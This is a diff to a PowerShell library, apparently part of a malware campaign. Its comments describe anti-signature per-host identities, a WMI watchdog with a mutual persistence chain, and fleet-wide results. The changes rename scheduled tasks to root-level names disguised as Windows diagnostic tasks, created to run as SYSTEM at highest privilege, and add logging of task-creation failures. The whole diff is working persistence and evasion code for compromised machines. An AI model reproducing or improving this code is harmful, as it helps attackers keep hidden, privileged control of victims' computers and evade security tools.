@@ -1,11 +1,11 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L11
+# OWN_LIB  BUILD 20260802L12
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L11: NEVER reuse real Windows built-in task names (Diagnosis\Scheduled etc.).
-#      Existence-only schtasks /Query was a false OK -> mon never ticked,
-#      no own_mon.log, auto-update dead. IDENTVER=6 unique names + TR ownership.
+# L12: IDENTVER=7 ROOT-level task names. Nested \Microsoft\Windows\* creates
+#      are Access Denied fleet-wide (verify_taskA-D_FAIL); WMI + WucacheOwn OK.
+# L11: NEVER reuse real Windows built-in task names; TR ownership checks.
 # L8: Test-SCRegistered fixed (ForEach-Object return never left function);
 #     DisplayName -ieq exact match; repair GUID walk uses foreach;
 #     SC research: per-FP UpgradeCode + legacy family Upgrade rows mean
@@ -27,22 +27,21 @@ param(
 
 $ErrorActionPreference = 'SilentlyContinue'
 $cfgPath = Join-Path $WorkDir 'identity.cfg'
-$IdentVersion = 6
+$IdentVersion = 7
 
-# Legit-looking task-name pools; per-host hash picks one per slot.
-# Parent folders must exist on Win10/11. Child names must NOT be real OS tasks
-# (v5 pools collided with Diagnosis\Scheduled / WDI\ResolutionHost / etc.).
+# ROOT-level task names only (single path segment). Nested Microsoft\Windows\*
+# folders reject Create with Access Denied on Win10/11 Home+Pro (fleet O32).
 $Pools = @{
-    A = @('\Microsoft\Windows\Diagnosis\EvtCacheSync','\Microsoft\Windows\Diagnosis\RecommendedCache','\Microsoft\Windows\NetTrace\GatherNetworkInfoEx','\Microsoft\Windows\WDI\ResolutionHostProxy','\Microsoft\Windows\PLA\ServerHealth','\Microsoft\Windows\Tcpip\IpConflictResolver','\Microsoft\Windows\Diagnosis\SRCache','\Microsoft\Windows\WDI\ResolutionQueue')
-    B = @('\Microsoft\Windows\PLA\ServerHealth','\Microsoft\Windows\WDI\ResolutionHostProxy','\Microsoft\Windows\Diagnosis\EvtCacheSync','\Microsoft\Windows\NetTrace\GatherNetworkInfoEx','\Microsoft\Windows\Diagnosis\RecommendedCache','\Microsoft\Windows\Tcpip\IpConflictResolver','\Microsoft\Windows\PLA\ServerDiagProxy','\Microsoft\Windows\Diagnosis\SRCache')
-    C = @('\Microsoft\Windows\WDI\ResolutionQueue','\Microsoft\Windows\NetTrace\GatherNetworkInfoEx','\Microsoft\Windows\Tcpip\IpConflictResolver','\Microsoft\Windows\Diagnosis\EvtCacheSync','\Microsoft\Windows\PLA\ServerHealth','\Microsoft\Windows\Diagnosis\RecommendedCache','\Microsoft\Windows\PLA\ServerDiagProxy','\Microsoft\Windows\WDI\ResolutionHostProxy')
-    D = @('\Microsoft\Windows\Tcpip\IpConflictResolver','\Microsoft\Windows\WDI\ResolutionQueue','\Microsoft\Windows\NetTrace\GatherNetworkInfoEx','\Microsoft\Windows\Diagnosis\RecommendedCache','\Microsoft\Windows\PLA\ServerDiagProxy','\Microsoft\Windows\Diagnosis\EvtCacheSync','\Microsoft\Windows\PLA\ServerHealth','\Microsoft\Windows\WDI\ResolutionHostProxy')
+    A = @('\WerQueueSync','\DiagHostCache','\NetTraceCache','\WdiHostProxy','\PlaServerHealth','\TcpIpConflictRes','\SrCacheSync','\ResolutionQueue')
+    B = @('\PlaServerHealth','\WdiHostProxy','\WerQueueSync','\NetTraceCache','\DiagHostCache','\TcpIpConflictRes','\PlaServerDiag','\SrCacheSync')
+    C = @('\ResolutionQueue','\NetTraceCache','\TcpIpConflictRes','\WerQueueSync','\PlaServerHealth','\DiagHostCache','\PlaServerDiag','\WdiHostProxy')
+    D = @('\TcpIpConflictRes','\ResolutionQueue','\NetTraceCache','\DiagHostCache','\PlaServerDiag','\WerQueueSync','\PlaServerHealth','\WdiHostProxy')
 }
 $Defaults = [ordered]@{
-    TASK_A = '\Microsoft\Windows\Diagnosis\EvtCacheSync'
-    TASK_B = '\Microsoft\Windows\PLA\ServerHealth'
-    TASK_C = '\Microsoft\Windows\WDI\ResolutionHostProxy'
-    TASK_D = '\Microsoft\Windows\Tcpip\IpConflictResolver'
+    TASK_A = '\WerQueueSync'
+    TASK_B = '\PlaServerHealth'
+    TASK_C = '\WdiHostProxy'
+    TASK_D = '\TcpIpConflictRes'
     MO_A   = '2'
     MO_B   = '3'
 }
@@ -136,6 +135,11 @@ function Initialize-Identity {
     return (Read-Identity)
 }
 
+function Write-OwnLog([string]$m) {
+    $log = Join-Path $WorkDir 'boot.err'
+    try { Add-Content -LiteralPath $log -Value $m -Force } catch {}
+}
+
 function Ensure-PersistTasks {
     # Create/repair A-D only when missing OR Task To Run is not ours (Windows collision).
     $id = Initialize-Identity
@@ -169,13 +173,18 @@ function Ensure-PersistTasks {
         }
         $args = @('/Create', '/TN', $tn, '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/F', '/TR', $sp.Tr, '/SC', $sp.Sc)
         if ($sp.Sc -eq 'MINUTE' -and $sp.Mo) { $args += @('/MO', $sp.Mo) }
-        & schtasks.exe @args 2>&1 | Out-Null
+        $createOut = & schtasks.exe @args 2>&1 | ForEach-Object { "$_" }
+        $createTxt = ($createOut -join ' ').Trim()
+        if ($createTxt) { Write-OwnLog "tasks_create $($sp.Key) $tn => $createTxt" }
         if (Test-TaskOwnsMon $tn $sp.Marker) {
             $rearmed++
             if ($sp.Key -eq 'TASK_A' -or $sp.Key -eq 'TASK_B') {
                 & schtasks.exe /Run /TN $tn 2>&1 | Out-Null
             }
-        } else { $fail++ }
+        } else {
+            $fail++
+            Write-OwnLog "tasks_create_FAIL $($sp.Key) $tn"
+        }
     }
     return "tasks ok=$ok rearmed=$rearmed fail=$fail"
 }
